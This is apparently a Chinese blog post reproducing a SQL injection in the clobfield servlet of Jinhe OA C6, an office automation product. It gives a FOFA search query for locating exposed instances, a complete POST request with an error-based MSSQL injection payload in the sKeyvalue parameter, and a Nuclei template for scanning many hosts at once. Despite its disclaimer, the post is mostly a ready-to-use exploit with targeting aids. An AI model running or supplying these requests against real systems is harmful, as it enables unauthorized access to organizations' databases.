# 原创
：  漏洞复现--金和OA clobfield SQL注入

# 漏洞复现--金和OA clobfield SQL注入

## 免责声明：

**文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行负责**

### 一：漏洞描述

金和OA协同办公管理系统C6软件（简称金和OA），本着简单、适用、高效的原则，贴合企事业单位的实际需求，实行通用化、标准化、智能化、人性化的产品设计，充分体现企事业单位规范管理、提高办公效率的核心思想，为用户提供一整套标准的办公自动化解决方案，以帮助企事业单位迅速建立便捷规范的办公环境。该产品存在SQL注入漏洞

### 二：漏洞影响版本

金和OA

### 三：网络空间测绘查询

fofa:<br/> `app="金和网络-金和OA"`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/38b53fa6f02d9029fa9bf94d96564fb7.jpeg"/>

### 四：漏洞复现

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/a27375f2ae0496eaab044a1f18f5438d.jpeg"/><br/> POC:

```
POST /jc6/servlet/clobfield HTTP/1.1
Host: X.X.X.X
User-Agent: Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36
Content-Length: 158
Accept: */*
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/x-www-form-urlencoded
SL-CE-SUID: 77

key=readClob&amp;sImgname=filename&amp;sTablename=FC_ATTACH&amp;sKeyname=djbh&amp;sKeyvalue=1' and 1=convert(int,(select sys.fn_sqlvarbasetostr(HashBytes('MD5','12345'))))--+

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/9aa7bc6623040efbd65fcc1e1fba4e40.jpeg"/><br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/ecf37129fe794614c710d0edfc93bf85.jpeg"/>

### 五：批量检测

```
id: JinHe-OA-clobfield-SQL-inject

info:
  name: JinHe-OA-clobfield-SQL-inject
  author: 芝士土拨鼠
  severity: high
  description: 金和OA协同办公管理系统C6软件（简称金和OA），本着简单、适用、高效的原则，贴合企事业单位的实际需求，实行通用化、标准化、智能化、人性化的产品设计，充分体现企事业单位规范管理、提高办公效率的核心思想，为用户提供一整套标准的办公自动化解决方案，以帮助企事业单位迅速建立便捷规范的办公环境。该产品存在SQL注入漏洞

requests:
  - raw:
      - |-
        POST /jc6/servlet/clobfield HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36
        Content-Length: 158
        Accept: */*
        Accept-Encoding: gzip, deflate, br, zstd
        Content-Type: application/x-www-form-urlencoded
        SL-CE-SUID: 77

        key=readClob&amp;sImgname=filename&amp;sTablename=FC_ATTACH&amp;sKeyname=djbh&amp;sKeyvalue=1' and 1=convert(int,(select sys.fn_sqlvarbasetostr(HashBytes('MD5','12345'))))--+

    matchers-condition: and
    matchers:
      - type: binary
        part: body
        binary:
          - e5b086206e766172
      - type: status
        status:
          - 200

```
